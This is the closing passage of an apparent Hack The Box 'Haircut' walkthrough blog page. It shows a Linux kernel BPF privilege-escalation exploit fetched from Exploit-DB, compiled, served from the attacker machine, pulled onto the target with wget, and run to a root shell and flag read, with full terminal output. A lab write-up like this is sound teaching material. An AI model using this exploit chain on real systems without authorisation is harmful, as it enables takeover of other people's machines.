+   Comments: CONFIG_BPF_SYSCALL needs to be <span class="nb">set</span> <span class="o">&amp;&amp;</span> kernel.unprivileged_bpf_disabled <span class="o">!=</span> 1
+
+   &lt;snip&gt;
+</code></pre></div></div> <p><br> Download the exploit to the current working folder.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/haircut]
+└─<span class="nv">$ </span>wget https://www.exploit-db.com/raw/45010 <span class="nt">-O</span> verify.c
+<span class="nt">--2025-01-19</span> 19:53:47--  https://www.exploit-db.com/raw/45010
+Resolving www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>... 192.124.249.13
+Connecting to www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified <span class="o">[</span>text/plain]
+Saving to: ‘verify.c’
+
+verify.c                                                       <span class="o">[</span>  &lt;<span class="o">=&gt;</span>                                                                                                                                    <span class="o">]</span>  13.41K  53.1KB/s    <span class="k">in </span>0.3s    
+
+2025-01-19 19:53:48 <span class="o">(</span>53.1 KB/s<span class="o">)</span> - ‘verify.c’ saved <span class="o">[</span>13728]
+<span class="nb">chmod</span> +x linpeas.sh
+</code></pre></div></div> <p><br> Compile the exploit.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/haircut]
+└─<span class="nv">$ </span>gcc verify.c <span class="nt">-o</span> verify <span class="nt">-static</span>
+</code></pre></div></div> <p><br> Download the exploit to the current working folder.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/dev/shm<span class="nv">$ </span>wget 10.10.16.3:8000/verify
+wget 10.10.16.3:8000/verify
+<span class="nt">--2025-01-19</span> 09:56:47--  http://10.10.16.3:8000/verify
+Connecting to 10.10.16.3:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 797792 <span class="o">(</span>779K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: <span class="s1">'verify'</span>
+
+verify              100%[<span class="o">===================&gt;]</span> 779.09K   869KB/s    <span class="k">in </span>0.9s    
+
+2025-01-19 09:56:48 <span class="o">(</span>869 KB/s<span class="o">)</span> - <span class="s1">'verify'</span> saved <span class="o">[</span>797792/797792]
+</code></pre></div></div> <p><br> Chmod the exploit to make it executable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x verify
+<span class="nb">chmod</span> +x verify
+</code></pre></div></div> <p><br> Run the exploit.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/dev/shm<span class="nv">$ </span>./verify
+./verify
+<span class="o">[</span>.] 
+<span class="o">[</span>.] t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span> exploit <span class="k">for </span>counterfeit grsec kernels such as KSPP and linux-hardened t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span>
+<span class="o">[</span>.] 
+<span class="o">[</span>.]   <span class="k">**</span> This vulnerability cannot be exploited at all on authentic grsecurity kernel <span class="k">**</span>
+<span class="o">[</span>.] 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating bpf map
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sneaking evil bpf past the verifier
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating socketpair<span class="o">()</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> attaching bpf backdoor to socket
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> skbuff <span class="o">=&gt;</span> ffff880079957100
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leaking sock struct from ffff88007810f800
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sock-&gt;sk_rcvtimeo at offset 472
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cred structure at ffff880077b8d480
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> UID from cred structure: 33, matches the current: 33
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> hammering cred structure at ffff880077b8d480
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> credentials patched, launching shell...
+<span class="c">#</span>
+</code></pre></div></div> <p><br> Run whoami to confirm that we are root.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># whoami</span>
+<span class="nb">whoami
+</span>root
+</code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat /root/root.txt</span>
+<span class="nb">cat</span> /root/root.txt
+&lt;redacted&gt;
+<span class="c"># ip a</span>
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 00:50:56:b9:9a:4c brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.24/24 brd 10.10.10.255 scope global ens160
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:9a4c/64 scope global mngtmpaddr dynamic 
+       valid_lft 86395sec preferred_lft 14395sec
+    inet6 fe80::250:56ff:feb9:9a4c/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> Look forward to seeing you in the next one.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
